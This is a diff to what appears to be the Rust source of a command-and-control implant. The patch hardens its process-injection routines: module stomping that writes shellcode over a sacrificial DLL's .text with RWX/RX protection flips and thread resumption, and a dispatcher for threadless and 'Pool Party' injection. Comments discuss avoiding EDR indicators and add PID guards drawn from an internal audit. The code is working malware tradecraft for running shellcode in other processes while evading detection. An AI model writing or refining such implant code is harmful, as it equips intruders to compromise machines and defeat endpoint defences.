@@ -212,11 +212,21 @@ unsafe fn stomp_and_resume(
         remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */)
     }?;
     // Step 4: WriteProcessMemory the shellcode over .text (real overwrite).
+    //
+    //    v0.3.0 wrote shellcode.len() bytes unconditionally into a region
+    //    capped at min(vsize, 0x2000). Any shellcode >8KiB overran into the
+    //    cover DLL's .rdata/.data, corrupting vtable/constant data and
+    //    crashing the sacrificial process on first reference. CRITICAL-15.
+    if shellcode.len() > text.len {
+        return Err("shellcode larger than cover .text window");
+    }
     unsafe { remote_write(proc.handle, text.base, shellcode) }?;
     // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
-    let _ = unsafe {
-        remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */)
-    };
+    //    Check the return — v0.3.0 used 'let _ =' and silently left .text RWX
+    //    on failure, which is a louder EDR IOC than the original RX.
+    if unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) }.is_err() {
+        return Err("VirtualProtectEx RWX→RX restore failed");
+    }
     // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
     let _ = unsafe { resume_thread(proc.main_thread) };
     Ok(())
@@ -788,6 +798,25 @@ pub unsafe fn threadless_inject(
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
+    // PID safety guard. Reject targets that would brick the host or the
+    // beacon itself. This runs BEFORE any dispatch so future Pool Party /
+    // remote-inject paths inherit the same protection. pid == 0 is the
+    // documented "spawn a fresh sacrificial process" sentinel and is allowed.
+    // HIGH-severity finding in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
+    if pid == 4 {
+        // PID 4 = System (kernel); OpenProcess writes would BSOD.
+        return nyx_protocol::Response::Err(crate::heap::String::from(
+            "refuse inject into pid 4 (System kernel process)",
+        ));
+    }
+    if pid != 0 && pid == crate::hostinfo::pid() {
+        // Self-inject serves no operational purpose and the operator almost
+        // certainly meant a different target (typo / stale tasking).
+        return nyx_protocol::Response::Err(crate::heap::String::from(
+            "refuse self-inject (target pid is the implant's own pid)",
+        ));
+    }
+
     // method 0 (Pool Party): gated research-grade technique. When
     // POOL_PARTY_ENABLED is on (operator opt-in via NYX_POOL_PARTY_ON=1) AND a
     // target pid is supplied, attempt the section-backed threadpool splice.
